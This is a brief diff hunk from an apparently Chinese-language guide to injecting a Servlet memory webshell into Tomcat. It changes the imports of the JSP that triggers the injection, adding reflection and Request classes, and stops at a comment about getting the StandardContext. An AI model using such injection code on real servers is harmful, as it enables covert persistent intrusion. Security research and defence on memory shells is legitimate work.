@@ -262,7 +262,8 @@ public class ServletMemShellInjector {
 ### 3.3 触发注入的 JSP
 
 ```jsp
-<%@ page import="org.apache.catalina.core.*, org.apache.catalina.Wrapper" %>
+<%@ page import="org.apache.catalina.core.*, org.apache.catalina.connector.Request,
+    java.lang.reflect.Field" %>
 <%
     try {
         // 获取 StandardContext
